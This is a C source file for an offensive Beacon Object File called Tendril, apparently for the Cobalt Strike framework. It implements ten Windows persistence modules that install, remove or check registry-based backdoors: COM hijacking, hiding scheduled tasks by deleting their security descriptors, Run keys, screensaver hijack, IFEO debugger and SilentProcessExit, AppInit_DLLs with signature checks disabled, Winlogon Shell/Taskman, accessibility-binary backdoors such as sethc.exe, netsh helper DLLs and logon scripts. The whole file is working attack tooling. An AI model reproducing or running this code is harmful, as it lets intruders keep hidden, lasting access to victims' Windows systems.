/*
 * tendril.c - Unified Tendril BOF
 *
 * Single BOF dispatches to all persistence modules.
 *
 * Arguments (packed by aggressor):
 *   short module   - module ID (see enum below)
 *   short action   - 0=install, 1=remove, 2=check
 *   wstr  arg1     - primary param   (payload path / DLL / command)
 *   wstr  arg2     - secondary param (name / CLSID / target exe)
 *   wstr  arg3     - tertiary param  (threading model / timeout / hive)
 */
#include "tendril.h"

 /* ---- Module IDs ---- */
enum {
	MOD_COM_HIJACK = 0,
	MOD_GHOST_TASK,
	MOD_REGISTRY_RUN,
	MOD_SCREENSAVER,
	MOD_IFEO_INJECT,
	MOD_APPINIT_DLLS,
	MOD_WINLOGON_HELPER,
	MOD_ACCESSIBILITY,
	MOD_NETSH_HELPER,
	MOD_USERINIT_MPR,
	MOD_COUNT
};

enum { ACT_INSTALL = 0, ACT_REMOVE = 1, ACT_CHECK = 2 };

/* ---- Wide-string compare (DFR-safe) ---- */
DECLSPEC_IMPORT int WINAPI KERNEL32$lstrcmpiW(LPCWSTR, LPCWSTR);

/* ================================================================
 * COM HIJACK - HKCU InProcServer32 override
 * arg1=dllPath  arg2=CLSID  arg3=ThreadingModel
 * ================================================================ */
static void mod_com_hijack(short action, wchar_t* arg1, wchar_t* arg2, wchar_t* arg3)
{
	wchar_t keyPath[512], keyPathFull[512];
	KERNEL32$lstrcpyW(keyPath, L"Software\\Classes\\CLSID\\");
	KERNEL32$lstrcatW(keyPath, arg2);
	KERNEL32$lstrcpyW(keyPathFull, keyPath);
	KERNEL32$lstrcatW(keyPathFull, L"\\InProcServer32");

	if (action == ACT_INSTALL)
	{
		LSTATUS s = tendril_reg_set_sz(HKEY_CURRENT_USER, keyPathFull, NULL, arg1);
		if (s == ERROR_SUCCESS)
		{
			LPCWSTR tm = (arg3[0] != 0) ? arg3 : L"Both";
			tendril_reg_set_sz(HKEY_CURRENT_USER, keyPathFull, L"ThreadingModel", tm);
			BeaconPrintf(CALLBACK_OUTPUT, "[+] COM hijack: %ls -> %ls", arg2, arg1);
		}
		else
			BeaconPrintf(CALLBACK_ERROR, "[-] COM hijack write failed: %d", s);
	}
	else if (action == ACT_REMOVE)
	{
		ADVAPI32$RegDeleteKeyExW(HKEY_CURRENT_USER, keyPathFull, KEY_WOW64_64KEY, 0);
		LSTATUS s = ADVAPI32$RegDeleteKeyExW(HKEY_CURRENT_USER, keyPath, KEY_WOW64_64KEY, 0);
		BeaconPrintf(s == ERROR_SUCCESS ? CALLBACK_OUTPUT : CALLBACK_ERROR,
			s == ERROR_SUCCESS ? "[+] COM hijack removed: %ls" : "[-] Remove failed: %ls (err %d)", arg2, s);
	}
	else /* check */
	{
		HKEY hKey;
		if (ADVAPI32$RegOpenKeyExW(HKEY_CURRENT_USER, keyPathFull, 0,
			KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS)
		{
			wchar_t data[512] = { 0 };
			DWORD cb = sizeof(data), type;
			ADVAPI32$RegQueryValueExW(hKey, NULL, NULL, &type, (LPBYTE)data, &cb);
			ADVAPI32$RegCloseKey(hKey);
			BeaconPrintf(CALLBACK_OUTPUT, "[*] HKCU COM override: %ls -> %ls", arg2, data);
		}
		else
			BeaconPrintf(CALLBACK_OUTPUT, "[*] No HKCU override for %ls", arg2);
	}
}

/* ================================================================
 * GHOST TASK - remove SD value to hide existing task
 * arg1=taskName  arg2/arg3 unused
 * ================================================================ */
#define TASK_CACHE_TREE L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree"

static void mod_ghost_task(short action, wchar_t* arg1, wchar_t* arg2, wchar_t* arg3)
{
	if (action == ACT_INSTALL) /* ghost = remove SD */
	{
		wchar_t kp[512];
		KERNEL32$lstrcpyW(kp, TASK_CACHE_TREE);
		KERNEL32$lstrcatW(kp, L"\\");
		KERNEL32$lstrcatW(kp, arg1);

		LSTATUS s = tendril_reg_delete_value(HKEY_LOCAL_MACHINE, kp, L"SD");
		BeaconPrintf(s == ERROR_SUCCESS ? CALLBACK_OUTPUT : CALLBACK_ERROR,
			s == ERROR_SUCCESS ? "[+] Task ghosted: %ls" : "[-] SD removal failed (err %d, admin?)", arg1, s);
	}
	else if (action == ACT_CHECK)
	{
		HKEY hTree;
		if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, TASK_CACHE_TREE, 0,
			KEY_READ | KEY_WOW64_64KEY, &hTree) != ERROR_SUCCESS)
		{
			BeaconPrintf(CALLBACK_ERROR, "[-] Cannot open TaskCache\\Tree");
			return;
		}

		DWORD idx = 0;
		wchar_t name[256];
		DWORD nameLen;
		int ghosts = 0;

		while (1)
		{
			nameLen = 256;
			if (ADVAPI32$RegEnumKeyExW(hTree, idx++, name, &nameLen,
				NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;

			wchar_t sub[512];
			KERNEL32$lstrcpyW(sub, TASK_CACHE_TREE);
			KERNEL32$lstrcatW(sub, L"\\");
			KERNEL32$lstrcatW(sub, name);

			HKEY hTask;
			if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, sub, 0,
				KEY_READ | KEY_WOW64_64KEY, &hTask) != ERROR_SUCCESS) continue;

			DWORD sdSize = 0, sdType;
			LSTATUS s = ADVAPI32$RegQueryValueExW(hTask, L"SD", NULL, &sdType, NULL, &sdSize);
			ADVAPI32$RegCloseKey(hTask);

			if (s == ERROR_FILE_NOT_FOUND)
			{
				BeaconPrintf(CALLBACK_OUTPUT, "[!] GHOST TASK: %ls", name);
				ghosts++;
			}
		}
		ADVAPI32$RegCloseKey(hTree);
		if (ghosts == 0) BeaconPrintf(CALLBACK_OUTPUT, "[*] No ghost tasks found");
	}
}

/* ================================================================
 * REGISTRY RUN KEY - HKCU or HKLM Run
 * arg1=payload  arg2=valueName  arg3=L"HKLM" or L"HKCU"
 * ================================================================ */
#define RUN_KEY L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"

static void mod_registry_run(short action, wchar_t* arg1, wchar_t* arg2, wchar_t* arg3)
{
	HKEY root = HKEY_CURRENT_USER;
	char* hiveName = "HKCU";
	if (KERNEL32$lstrcmpiW(arg3, L"HKLM") == 0) { root = HKEY_LOCAL_MACHINE; hiveName = "HKLM"; }

	if (action == ACT_INSTALL)
	{
		LSTATUS s = tendril_reg_set_sz(root, RUN_KEY, arg2, arg1);
		BeaconPrintf(s == ERROR_SUCCESS ? CALLBACK_OUTPUT : CALLBACK_ERROR,
			s == ERROR_SUCCESS ? "[+] %s Run key: %ls = %ls" : "[-] Run key failed: %d", hiveName, arg2, arg1, s);
	}
	else if (action == ACT_REMOVE)
	{
		tendril_reg_delete_value(root, RUN_KEY, arg2);
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Run key removed: %ls", arg2);
	}
	else
	{
		HKEY hKey;
		if (ADVAPI32$RegOpenKeyExW(root, RUN_KEY, 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS)
		{
			DWORD idx = 0;
			wchar_t vName[256], vData[1024];
			DWORD vnLen, vdLen, type;
			while (1)
			{
				vnLen = 256; vdLen = sizeof(vData);
				if (ADVAPI32$RegEnumKeyExW(hKey, idx++, vName, &vnLen, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
			}
			/* Simpler: just query the specific value if arg2 is set */
			vdLen = sizeof(vData);
			if (ADVAPI32$RegQueryValueExW(hKey, arg2, NULL, &type, (LPBYTE)vData, &vdLen) == ERROR_SUCCESS)
				BeaconPrintf(CALLBACK_OUTPUT, "[*] %s\\...\\Run\\%ls = %ls", hiveName, arg2, vData);
			else
				BeaconPrintf(CALLBACK_OUTPUT, "[*] No Run key entry: %ls", arg2);
			ADVAPI32$RegCloseKey(hKey);
		}
	}
}

/* ================================================================
 * SCREENSAVER - HKCU Control Panel\Desktop
 * arg1=payload  arg2=timeout  arg3 unused
 * ================================================================ */
#define DESKTOP_KEY L"Control Panel\\Desktop"

static void mod_screensaver(short action, wchar_t* arg1, wchar_t* arg2, wchar_t* arg3)
{
	if (action == ACT_INSTALL)
	{
		LSTATUS s1 = tendril_reg_set_sz(HKEY_CURRENT_USER, DESKTOP_KEY, L"SCRNSAVE.EXE", arg1);
		tendril_reg_set_sz(HKEY_CURRENT_USER, DESKTOP_KEY, L"ScreenSaveActive", L"1");
		tendril_reg_set_sz(HKEY_CURRENT_USER, DESKTOP_KEY, L"ScreenSaveTimeOut", arg2[0] ? arg2 : L"600");
		tendril_reg_set_sz(HKEY_CURRENT_USER, DESKTOP_KEY, L"ScreenSaverIsSecure", L"0");
		BeaconPrintf(s1 == ERROR_SUCCESS ? CALLBACK_OUTPUT : CALLBACK_ERROR,
			s1 == ERROR_SUCCESS ? "[+] Screensaver: %ls (timeout %ls)" : "[-] Failed: %d", arg1, arg2, s1);
	}
	else if (action == ACT_REMOVE)
	{
		tendril_reg_delete_value(HKEY_CURRENT_USER, DESKTOP_KEY, L"SCRNSAVE.EXE");
		tendril_reg_set_sz(HKEY_CURRENT_USER, DESKTOP_KEY, L"ScreenSaveActive", L"0");
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Screensaver persistence removed");
	}
	else
	{
		HKEY hKey;
		if (ADVAPI32$RegOpenKeyExW(HKEY_CURRENT_USER, DESKTOP_KEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
		{
			wchar_t scr[512] = { 0 };
			DWORD cb = sizeof(scr), type;
			ADVAPI32$RegQueryValueExW(hKey, L"SCRNSAVE.EXE", NULL, &type, (LPBYTE)scr, &cb);
			ADVAPI32$RegCloseKey(hKey);
			if (scr[0]) BeaconPrintf(CALLBACK_OUTPUT, "[*] Screensaver: %ls", scr);
			else BeaconPrintf(CALLBACK_OUTPUT, "[*] No screensaver set");
		}
	}
}

/* ================================================================
 * IFEO INJECTION - Debugger or SilentProcessExit
 * arg1=payload  arg2=target exe  arg3=L"silent" or L"debugger"
 * ================================================================ */
#define IFEO_PATH L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"
#define SILENT_PATH L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit"

static void mod_ifeo_inject(short action, wchar_t* arg1, wchar_t* arg2, wchar_t* arg3)
{
	wchar_t ifeoKey[512];
	KERNEL32$lstrcpyW(ifeoKey, IFEO_PATH);
	KERNEL32$lstrcatW(ifeoKey, L"\\");
	KERNEL32$lstrcatW(ifeoKey, arg2);

	BOOL isSilent = (KERNEL32$lstrcmpiW(arg3, L"silent") == 0);

	if (action == ACT_INSTALL)
	{
		if (isSilent)
		{
			tendril_reg_set_dword(HKEY_LOCAL_MACHINE, ifeoKey, L"GlobalFlag", 0x200);
			wchar_t silentKey[512];
			KERNEL32$lstrcpyW(silentKey, SILENT_PATH);
			KERNEL32$lstrcatW(silentKey, L"\\");
			KERNEL32$lstrcatW(silentKey, arg2);
			tendril_reg_set_dword(HKEY_LOCAL_MACHINE, silentKey, L"ReportingMode", 1);
			LSTATUS s = tendril_reg_set_sz(HKEY_LOCAL_MACHINE, silentKey, L"MonitorProcess", arg1);
			BeaconPrintf(s == ERROR_SUCCESS ? CALLBACK_OUTPUT : CALLBACK_ERROR,
				s == ERROR_SUCCESS ? "[+] SilentProcessExit: %ls -> %ls" : "[-] Failed: %d", arg2, arg1, s);
		}
		else
		{
			LSTATUS s = tendril_reg_set_sz(HKEY_LOCAL_MACHINE, ifeoKey, L"Debugger", arg1);
			BeaconPrintf(s == ERROR_SUCCESS ? CALLBACK_OUTPUT : CALLBACK_ERROR,
				s == ERROR_SUCCESS ? "[+] IFEO Debugger: %ls -> %ls" : "[-] Failed: %d", arg2, arg1, s);
		}
	}
	else if (action == ACT_REMOVE)
	{
		if (isSilent)
		{
			tendril_reg_delete_value(HKEY_LOCAL_MACHINE, ifeoKey, L"GlobalFlag");
			wchar_t silentKey[512];
			KERNEL32$lstrcpyW(silentKey, SILENT_PATH);
			KERNEL32$lstrcatW(silentKey, L"\\");
			KERNEL32$lstrcatW(silentKey, arg2);
			ADVAPI32$RegDeleteKeyExW(HKEY_LOCAL_MACHINE, silentKey, KEY_WOW64_64KEY, 0);
		}
		else
			tendril_reg_delete_value(HKEY_LOCAL_MACHINE, ifeoKey, L"Debugger");
		BeaconPrintf(CALLBACK_OUTPUT, "[+] IFEO removed from %ls", arg2);
	}
	else
	{
		HKEY hKey;
		if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, ifeoKey, 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS)
		{
			wchar_t dbg[512] = { 0 };
			DWORD cb = sizeof(dbg), type;
			if (ADVAPI32$RegQueryValueExW(hKey, L"Debugger", NULL, &type, (LPBYTE)dbg, &cb) == ERROR_SUCCESS)
				BeaconPrintf(CALLBACK_OUTPUT, "[*] IFEO Debugger on %ls: %ls", arg2, dbg);
			ADVAPI32$RegCloseKey(hKey);
		}
	}
}

/* ================================================================
 * APPINIT_DLLS
 * arg1=dllPath  arg2=L"x86" or L"x64"  arg3 unused
 * ================================================================ */
#define APPINIT_64 L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows"
#define APPINIT_32 L"SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows"

static void mod_appinit_dlls(short action, wchar_t* arg1, wchar_t* arg2, wchar_t* arg3)
{
	LPCWSTR rp = (KERNEL32$lstrcmpiW(arg2, L"x86") == 0) ? APPINIT_32 : APPINIT_64;

	if (action == ACT_INSTALL)
	{
		LSTATUS s1 = tendril_reg_set_sz(HKEY_LOCAL_MACHINE, rp, L"AppInit_DLLs", arg1);
		tendril_reg_set_dword(HKEY_LOCAL_MACHINE, rp, L"LoadAppInit_DLLs", 1);
		tendril_reg_set_dword(HKEY_LOCAL_MACHINE, rp, L"RequireSignedAppInit_DLLs", 0);
		BeaconPrintf(s1 == ERROR_SUCCESS ? CALLBACK_OUTPUT : CALLBACK_ERROR,
			s1 == ERROR_SUCCESS ? "[+] AppInit_DLLs: %ls" : "[-] Failed: %d", arg1, s1);
	}
	else if (action == ACT_REMOVE)
	{
		tendril_reg_set_sz(HKEY_LOCAL_MACHINE, rp, L"AppInit_DLLs", L"");
		tendril_reg_set_dword(HKEY_LOCAL_MACHINE, rp, L"LoadAppInit_DLLs", 0);
		BeaconPrintf(CALLBACK_OUTPUT, "[+] AppInit_DLLs cleared");
	}
	else
	{
		HKEY hKey;
		if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, rp, 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS)
		{
			wchar_t data[1024] = { 0 };
			DWORD cb = sizeof(data), type;
			ADVAPI32$RegQueryValueExW(hKey, L"AppInit_DLLs", NULL, &type, (LPBYTE)data, &cb);
			ADVAPI32$RegCloseKey(hKey);
			if (data[0]) BeaconPrintf(CALLBACK_OUTPUT, "[*] AppInit_DLLs: %ls", data);
			else BeaconPrintf(CALLBACK_OUTPUT, "[*] AppInit_DLLs empty");
		}
	}
}

/* ================================================================
 * WINLOGON HELPER - Shell / Taskman
 * arg1=payload  arg2=L"Shell" or L"Taskman"  arg3=L"HKLM" or L"HKCU"
 * ================================================================ */
#define WINLOGON_PATH L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"

static void mod_winlogon_helper(short action, wchar_t* arg1, wchar_t* arg2, wchar_t* arg3)
{
	HKEY root = HKEY_CURRENT_USER;
	if (KERNEL32$lstrcmpiW(arg3, L"HKLM") == 0) root = HKEY_LOCAL_MACHINE;

	if (action == ACT_INSTALL)
	{
		/* Read current value and append for Shell */
		HKEY hKey;
		wchar_t cur[1024] = { 0 };
		DWORD cb = sizeof(cur), type;
		if (ADVAPI32$RegOpenKeyExW(root, WINLOGON_PATH, 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS)
		{
			ADVAPI32$RegQueryValueExW(hKey, arg2, NULL, &type, (LPBYTE)cur, &cb);
			ADVAPI32$RegCloseKey(hKey);
		}

		wchar_t newVal[2048];
		if (cur[0])
		{
			KERNEL32$lstrcpyW(newVal, cur);
			KERNEL32$lstrcatW(newVal, L", ");
			KERNEL32$lstrcatW(newVal, arg1);
		}
		else
			KERNEL32$lstrcpyW(newVal, arg1);

		LSTATUS s = tendril_reg_set_sz(root, WINLOGON_PATH, arg2, newVal);
		BeaconPrintf(s == ERROR_SUCCESS ? CALLBACK_OUTPUT : CALLBACK_ERROR,
			s == ERROR_SUCCESS ? "[+] Winlogon %ls: %ls" : "[-] Failed: %d", arg2, newVal, s);
	}
	else if (action == ACT_REMOVE)
	{
		tendril_reg_delete_value(root, WINLOGON_PATH, arg2);
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Winlogon %ls removed", arg2);
	}
	else
	{
		HKEY hKey;
		if (ADVAPI32$RegOpenKeyExW(root, WINLOGON_PATH, 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS)
		{
			wchar_t data[1024] = { 0 };
			DWORD cb = sizeof(data), type;
			if (ADVAPI32$RegQueryValueExW(hKey, arg2, NULL, &type, (LPBYTE)data, &cb) == ERROR_SUCCESS)
				BeaconPrintf(CALLBACK_OUTPUT, "[*] Winlogon %ls: %ls", arg2, data);
			ADVAPI32$RegCloseKey(hKey);
		}
	}
}

/* ================================================================
 * ACCESSIBILITY BACKDOOR - IFEO on sethc/utilman/narrator/osk/magnify
 * arg1=payload  arg2=target exe name (e.g. L"sethc.exe")  arg3 unused
 * ================================================================ */
static void mod_accessibility(short action, wchar_t* arg1, wchar_t* arg2, wchar_t* arg3)
{
	/* Reuse IFEO logic with debugger mode */
	wchar_t dbg[] = L"debugger";
	mod_ifeo_inject(action, arg1, arg2, dbg);
}

/* ================================================================
 * NETSH HELPER DLL
 * arg1=dllPath  arg2=valueName  arg3 unused
 * ================================================================ */
#define NETSH_PATH L"SOFTWARE\\Microsoft\\NetSh"

static void mod_netsh_helper(short action, wchar_t* arg1, wchar_t* arg2, wchar_t* arg3)
{
	if (action == ACT_INSTALL)
	{
		LSTATUS s = tendril_reg_set_sz(HKEY_LOCAL_MACHINE, NETSH_PATH, arg2, arg1);
		BeaconPrintf(s == ERROR_SUCCESS ? CALLBACK_OUTPUT : CALLBACK_ERROR,
			s == ERROR_SUCCESS ? "[+] Netsh helper: %ls -> %ls" : "[-] Failed: %d", arg2, arg1, s);
	}
	else if (action == ACT_REMOVE)
	{
		tendril_reg_delete_value(HKEY_LOCAL_MACHINE, NETSH_PATH, arg2);
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Netsh helper removed: %ls", arg2);
	}
	else
	{
		HKEY hKey;
		if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, NETSH_PATH, 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS)
		{
			wchar_t data[512] = { 0 };
			DWORD cb = sizeof(data), type;
			if (ADVAPI32$RegQueryValueExW(hKey, arg2, NULL, &type, (LPBYTE)data, &cb) == ERROR_SUCCESS)
				BeaconPrintf(CALLBACK_OUTPUT, "[*] Netsh %ls: %ls", arg2, data);
			else
				BeaconPrintf(CALLBACK_OUTPUT, "[*] No netsh helper: %ls", arg2);
			ADVAPI32$RegCloseKey(hKey);
		}
	}
}

/* ================================================================
 * USERINIT MPR LOGON SCRIPT - HKCU\Environment
 * arg1=payload  arg2/arg3 unused
 * ================================================================ */
static void mod_userinit_mpr(short action, wchar_t* arg1, wchar_t* arg2, wchar_t* arg3)
{
	if (action == ACT_INSTALL)
	{
		LSTATUS s = tendril_reg_set_sz(HKEY_CURRENT_USER, L"Environment",
			L"UserInitMprLogonScript", arg1);
		BeaconPrintf(s == ERROR_SUCCESS ? CALLBACK_OUTPUT : CALLBACK_ERROR,
			s == ERROR_SUCCESS ? "[+] UserInitMprLogonScript: %ls" : "[-] Failed: %d", arg1, s);
	}
	else if (action == ACT_REMOVE)
	{
		tendril_reg_delete_value(HKEY_CURRENT_USER, L"Environment", L"UserInitMprLogonScript");
		BeaconPrintf(CALLBACK_OUTPUT, "[+] UserInitMprLogonScript removed");
	}
	else
	{
		HKEY hKey;
		if (ADVAPI32$RegOpenKeyExW(HKEY_CURRENT_USER, L"Environment", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
		{
			wchar_t data[1024] = { 0 };
			DWORD cb = sizeof(data), type;
			if (ADVAPI32$RegQueryValueExW(hKey, L"UserInitMprLogonScript", NULL, &type, (LPBYTE)data, &cb) == ERROR_SUCCESS)
				BeaconPrintf(CALLBACK_OUTPUT, "[*] UserInitMprLogonScript: %ls", data);
			else
				BeaconPrintf(CALLBACK_OUTPUT, "[*] UserInitMprLogonScript not set");
			ADVAPI32$RegCloseKey(hKey);
		}
	}
}

/* ================================================================
 * DISPATCH - single entry point
 * ================================================================ */
void go(char* args, int alen)
{
	datap parser;
	BeaconDataParse(&parser, args, alen);

	short module = BeaconDataShort(&parser);
	short action = BeaconDataShort(&parser);

	int a1Len, a2Len, a3Len;
	wchar_t* arg1 = (wchar_t*)BeaconDataExtract(&parser, &a1Len);
	wchar_t* arg2 = (wchar_t*)BeaconDataExtract(&parser, &a2Len);
	wchar_t* arg3 = (wchar_t*)BeaconDataExtract(&parser, &a3Len);

	switch (module)
	{
	case MOD_COM_HIJACK:      mod_com_hijack(action, arg1, arg2, arg3);      break;
	case MOD_GHOST_TASK:      mod_ghost_task(action, arg1, arg2, arg3);      break;
	case MOD_REGISTRY_RUN:    mod_registry_run(action, arg1, arg2, arg3);    break;
	case MOD_SCREENSAVER:     mod_screensaver(action, arg1, arg2, arg3);     break;
	case MOD_IFEO_INJECT:     mod_ifeo_inject(action, arg1, arg2, arg3);     break;
	case MOD_APPINIT_DLLS:    mod_appinit_dlls(action, arg1, arg2, arg3);    break;
	case MOD_WINLOGON_HELPER: mod_winlogon_helper(action, arg1, arg2, arg3); break;
	case MOD_ACCESSIBILITY:   mod_accessibility(action, arg1, arg2, arg3);   break;
	case MOD_NETSH_HELPER:    mod_netsh_helper(action, arg1, arg2, arg3);    break;
	case MOD_USERINIT_MPR:    mod_userinit_mpr(action, arg1, arg2, arg3);    break;
	default:
		BeaconPrintf(CALLBACK_ERROR, "[-] Unknown module ID: %d (valid: 0-%d)", module, MOD_COUNT - 1);
		break;
	}
}
